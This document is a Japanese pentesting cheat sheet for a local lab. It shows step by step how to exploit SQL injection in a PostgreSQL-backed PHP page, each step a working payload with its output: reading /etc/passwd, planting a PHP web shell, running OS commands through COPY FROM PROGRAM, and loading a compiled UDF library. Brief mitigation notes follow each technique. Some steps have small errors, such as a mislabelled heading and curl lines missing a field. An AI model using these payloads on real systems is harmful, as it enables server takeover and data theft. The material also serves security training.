# PostgreSQL Pentesting Techniques

<!-- @import "[TOC]" {cmd="toc" depthFrom=2 depthTo=6 orderedList=false} -->

<!-- code_chunk_output -->

- [Normal request](#normal-request)
- [Query log](#query-log)
- [Basic SQL Injection](#basic-sql-injection)
- [lo_import - Read file](#lo_import-read-file)
  - [前提条件](#前提条件)
  - [手順](#手順)
    - [Step 1: 任意のファイルをlo_importでロードする](#step-1-任意のファイルをlo_importでロードする)
    - [Step 2: ファイル内容を読み出す](#step-2-ファイル内容を読み出す)
  - [対策](#対策)
- [lo_export - Write a PHP file to RCE](#lo_export-write-a-php-file-to-rce)
  - [前提条件](#前提条件-1)
  - [手順](#手順-1)
    - [Step 1: Large Objectを作る](#step-1-large-objectを作る)
    - [Step 2: Large Objectを書き換える](#step-2-large-objectを書き換える)
    - [Step 3: ファイル内容を書き出す](#step-3-ファイル内容を書き出す)
    - [Step 4: PHP経由でOSコマンドを実行する](#step-4-php経由でosコマンドを実行する)
  - [対策](#対策-1)
- [COPY TO/FROM PROGRAM - RCE](#copy-tofrom-program-rce)
  - [前提条件](#前提条件-2)
  - [アイデア](#アイデア)
  - [手順](#手順-2)
    - [Step 1: Postgresバージョンを確認](#step-1-postgresバージョンを確認)
    - [Step 2: コマンド結果を保存するテーブルを作成](#step-2-コマンド結果を保存するテーブルを作成)
    - [Step 3: COPY FROM PROGRAMを使用してコマンドを実行](#step-3-copy-from-programを使用してコマンドを実行)
    - [Step 4: UNION SELECTで結果を読み出し](#step-4-union-selectで結果を読み出し)
  - [対策](#対策-2)
- [UDF - Write a plugin file to RCE](#udf-write-a-plugin-file-to-rce)
  - [対策](#対策-3)
  - [アイデア](#アイデア-1)
  - [手順](#手順-3)
    - [Step 1: プラグインをコンパイルする](#step-1-プラグインをコンパイルする)
    - [Step 2: Large Objectを作る](#step-2-large-objectを作る)
    - [Step 3: Large Objectを書き換える](#step-3-large-objectを書き換える)
    - [Step 4: プラグインを書き込む](#step-4-プラグインを書き込む)
    - [Step 5: プラグインをロードしてUDFを作成する](#step-5-プラグインをロードしてudfを作成する)
    - [Step 6: UDF経由でOSコマンドを実行する](#step-6-udf経由でosコマンドを実行する)
  - [対策](#対策-4)

<!-- /code_chunk_output -->


## Normal request

```
http://localhost:8888/postgres.php?user=admin&pass=p4ssw0rd
```


## Query log

- stderrに出力される
- `docker-compose up`を実行したターミナル上で確認できる


## Basic SQL Injection

**UNION SELECT**

```
http://localhost:8888/postgres.php?user=&pass=' UNION ALL SELECT 1,'2','3';--+
```

```
http://localhost:8888/postgres.php?user=&pass=' UNION ALL SELECT id, username, password FROM users;--+
```


**複文実行**

```
http://localhost:8888/postgres.php?user=&pass='; INSERT INTO users VALUES (1337, 'pwned', 'hello');--+
```

```
http://localhost:8888/postgres.php?user=&pass='; DELETE FROM users WHERE username='pwned';--+
```


## lo_import - Read file

### 前提条件

- lo_compat_privilegesが有効化されていること（バージョン9.0以前はデフォルト有効）


### 手順

#### Step 1: 任意のファイルをlo_importでロードする

Large Objectとしてファイルの内容がロードされる。

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import('/etc/passwd',1337);--
```


#### Step 2: ファイル内容を読み出す

pg_largeobjectからLarge Object内のデータを取り出す。

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1, '', CAST(data AS TEXT) FROM pg_largeobject WHERE loid = 1337;--+
```

> result:
>
> id=1, username=, password=\x726f6f743a783a303a303a726f6f743a2f726f6f743a2f62696e2f626173680a6461656d6f6e3a783a313a313a6461656d6f6e3a2f7573722f7362696e3a2f7573722f7362696e2f6e6f6c6f67696e0a62696e3a783a323a323a62696e3a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7379733a783a333a333a7379733a2f6465763a2f7573722f7362696e2f6e6f6c6f67696e0a73796e633a783a343a36353533343a73796e633a2f62696e3a2f62696e2f73796e630a67616d65733a783a353a36303a67616d65733a2f7573722f67616d65733a2f7573722f7362696e2f6e6f6c6f67696e0a6d616e3a783a363a31323a6d616e3a2f7661722f63616368652f6d616e3a2f7573722f7362696e2f6e6f6c6f67696e0a6c703a783a373a373a6c703a2f7661722f73706f6f6c2f6c70643a2f7573722f7362696e2f6e6f6c6f67696e0a6d61696c3a783a383a383a6d61696c3a2f7661722f6d61696c3a2f7573722f7362696e2f6e6f6c6f67696e0a6e6577733a783a393a393a6e6577733a2f7661722f73706f6f6c2f6e6577733a2f7573722f7362696e2f6e6f6c6f67696e0a757563703a783a31303a31303a757563703a2f7661722f73706f6f6c2f757563703a2f7573722f7362696e2f6e6f6c6f67696e0a70726f78793a783a31333a31333a70726f78793a2f62696e3a2f7573722f7362696e2f6e6f6c6f67696e0a7777772d646174613a783a33333a33333a7777772d646174613a2f7661722f7777773a2f7573722f7362696e2f6e6f6c6f67696e0a6261636b75703a783a33343a33343a6261636b75703a2f7661722f6261636b7570733a2f7573722f7362696e2f6e6f6c6f67696e0a6c6973743a783a33383a33383a4d61696c696e67204c697374204d616e616765723a2f7661722f6c6973743a2f7573722f7362696e2f6e6f6c6f67696e0a6972633a783a33393a33393a697263643a2f7661722f72756e2f697263643a2f7573722f7362696e2f6e6f6c6f67696e0a676e6174733a783a34313a34313a476e617473204275672d5265706f7274696e672053797374656d202861646d696e293a2f7661722f6c69622f676e6174733a2f7573722f7362696e2f6e6f6c6f67696e0a6e6f626f64793a783a36353533343a36353533343a6e6f626f64793a2f6e6f6e6578697374656e743a2f7573722f7362696e2f6e6f6c6f67696e0a5f6170743a783a3130303a36353533343a3a2f6e6f6e6578697374656e743a2f62696e2f66616c73650a706f7374677265733a783a3939393a3939393a3a2f7661722f6c69622f706f737467726573716c3a2f62696e2f626173680a

16進数表現をデコードする。

```
❯ python ./scripts/hex2str.py '726f...680a'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/bin/false
postgres:x:999:999::/var/lib/postgresql:/bin/bash
```


### 対策

- lo_compat_privilegesオプションを無効化し、ファイルアクセスを禁止する


## lo_export - Write a PHP file to RCE

### 前提条件

- lo_compat_privilegesが有効化されていること（バージョン9.0以前はデフォルト有効）
- PostgreSQLがPHPの公開ディレクトリにアクセスできる場合


### 手順

#### Step 1: Large Objectを作る

lo_importでLarge Objectを作成する。

第2引数のファイルパスについては、Large Objectの作成に成功するならどのファイルを指定しても問題ない。ここでは、確実に存在するファイルとして`/etc/passwd`を指定している。

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 1,'',''||lo_import('/etc/passwd',1337);--+
```


#### Step 2: Large Objectを書き換える

以下のデータをLarge Objectに書き込む。

```php
<?php $param=$_GET["cmd"]; echo shell_exec($param);
```

16進数表現にエンコードしてからクエリに埋め込む。

```
❯ python ./scripts/str2hex.py '<?php $param=$_GET["cmd"]; echo shell_exec($param);'
3c3f7068702024706172616d3d245f4745545b22636d64225d3b206563686f207368656c6c5f657865632824706172616d293b
```

```
http://localhost:8888/postgres.php?user=&pass='; UPDATE pg_largeobject SET pageno=0, data=decode('3c3f7068702024706172616d3d245f4745545b22636d64225d3b206563686f207368656c6c5f657865632824706172616d293b','hex') WHERE loid=1337;--+ 
```


#### Step 3: ファイル内容を書き出す

Large Object内のデータをPHPファイルとして書き出す。

```
http://localhost:8888/postgres.php?user=&pass='; SELECT lo_export(1337,'/var/www/html/poc.php');--+
```


#### Step 4: PHP経由でOSコマンドを実行する

書き込みに成功していれば以下のURLで任意コマンド実行ができる。

```
http://localhost:8888/poc.php?cmd=id
```

```
❯ curl 'http://localhost:8888/poc.php?cmd=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```


### 対策

- PostgreSQLとWebサーバは分離した構成にする
- lo_compat_privilegesオプションを無効化し、ファイルアクセスを禁止する


## COPY TO/FROM PROGRAM - RCE

### 前提条件

- Postgres 9.3 以降が使用されていること
- `pg_execute_server_program`を持ったユーザ、もしくはスーパーユーザーとしてSQL文が実行できる


### アイデア

- Postgres 9.3 以降は COPY TO/FROM PROGRAM 機能によって簡単にRCEができる
  - https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5


### 手順

#### Step 1: Postgresバージョンを確認

Postgres 9.3 以降が使用されていることを確認する。

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 0,version(),'';--+
```

> result:
>
> id=0, username=PostgreSQL 11.12 (Debian 11.12-1.pgdg90+1) on x86_64-pc-linux-gnu, compiled by gcc (Debian 6.3.0-18+deb9u1) 6.3.0 20170516, 64-bit, password=


#### Step 2: コマンド結果を保存するテーブルを作成

実行したコマンドの結果を格納するためのテーブルを作成する。

```
http://localhost:8888/postgres.php?user=&pass='; DROP TABLE IF EXISTS cmd_exec;CREATE TABLE cmd_exec(cmd_output text);--+
```


#### Step 3: COPY FROM PROGRAMを使用してコマンドを実行

コマンドを実行し、結果を作成したテーブルに格納する。

```
http://localhost:8888/postgres.php?user=&pass='; COPY cmd_exec FROM PROGRAM 'uname -a';--+
```


#### Step 4: UNION SELECTで結果を読み出し

コマンド実行に成功した場合、作成したテーブルの `cmd_output` 列に実行結果が格納されているので、UNION SELECTで読み出す。

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 0,cmd_output,'' FROM cmd_exec;--+
```

> result:
>
> id=0, username=Linux e40ad9fb08b1 5.10.25-linuxkit #1 SMP Tue Mar 23 09:27:39 UTC 2021 x86_64 GNU/Linux, password=


### 対策

- postgresユーザに必要最小限の権限のみを付与する


## UDF - Write a plugin file to RCE

### 対策

- lo_compat_privilegesが有効化されていること（バージョン9.0以前はデフォルト有効）

### アイデア

- https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1
- https://github.com/sqlmapproject/udfhack/tree/master/linux/lib_postgresqludf_sys
- 基本的な考え方はMySQLのUDFと同じだが、Large Objectの仕様のためバイナリファイルを書き込むために工夫が必要


### 手順

#### Step 1: プラグインをコンパイルする

dockerコマンドでPostgreSQLのコンテナ内に入る。

ここでは練習のためターゲットサーバ内でコンパイルを実行するが、ペンテストの際はターゲットサーバと同じアーキテクチャ、PostgreSQLバージョンで他にサーバを建てて、その中でコンパイルする。

```
docker exec -it sqli-playground_postgres_1 /bin/sh
```


プラグインを共有ライブラリとしてコンパイルする。

```
cd /tmp
git clone https://github.com/sqlmapproject/udfhack
cd ./udfhack/linux/lib_postgresqludf_sys/
gcc lib_postgresqludf_sys.c -I$(pg_config --includedir-server) -fPIC -shared -o pg_udfsys.so
```


バイナリファイルをホスト側にコピーする。

```
exit
docker cp sqli-playground_postgres_1:/tmp/udfhack/linux/lib_postgresqludf_sys/pg_udfsys.so .
```


#### Step 2: Large Objectを作る

既に存在するLarge Objectを削除してから、新たにLarge Objectを作成する。

```
http://localhost:8888/postgres.php?user=&pass='; SELECT lo_unlink(1337);--+
```

```
http://localhost:8888/postgres.php?user=&pass='; SELECT lo_import('/etc/passwd',1337);--+
```


#### Step 3: Large Objectを書き換える

Large Objectのページサイズは2048なので一度に2048バイトしか書き込むことができない。

バイナリファイルを2048バイトずつに分割し、ページをPG_LARGEOBJECTテーブルへ順番に追加していく。

```
curl http://localhost:8888/postgres.php \
  -d 'user=' \
  -d "pass='; UPDATE pg_largeobject SET pageno=0, data=decode(/*hex binary (range: 0-2047)*/,'hex') WHERE loid=1337;--+"
```

```
curl http://localhost:8888/postgres.php \
  -d 'user=' \
  -d "'; INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (1337, 1, decode(/*hex binary (range: 2048-4095)*/,'hex'));--+"

curl http://localhost:8888/postgres.php \
  -d 'user=' \
  -d "'; INSERT INTO PG_LARGEOBJECT (loid, pageno, data) VALUES (1337, 1, decode(/*hex binary (range: 4096-6143)*/,'hex'));--+"

...
```


#### Step 4: プラグインを書き込む

MySQLの場合とは異なり、プラグイン書き出し先のディレクトリに制限はないので、任意のディレクトリへ書き込む。

```
http://localhost:8888/postgres.php?user=&pass='; SELECT lo_export(1337, '/tmp/pg_udfsys.so');--+
```


#### Step 5: プラグインをロードしてUDFを作成する

書き出したバイナリファイルをロードし、バイナリ中の `sys_eval` シンボルの関数を `exec` というSQL関数として実行できるようにする。

```
http://localhost:8888/postgres.php?user=&pass='; CREATE OR REPLACE FUNCTION exec(char) RETURNS CHAR as '/tmp/pg_udfsys.so','sys_eval' language c strict;--+
```


#### Step 6: UDF経由でOSコマンドを実行する

UDFの作成に成功した場合、`exec` 関数を用いてOSコマンド実行ができるようになる。

```
http://localhost:8888/postgres.php?user=&pass=' UNION SELECT 0,exec('id'),'';--+
```

> result:
>
> id=0, username=uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert), password=


### 対策

- lo_compat_privilegesオプションを無効化し、ファイルアクセスを禁止する
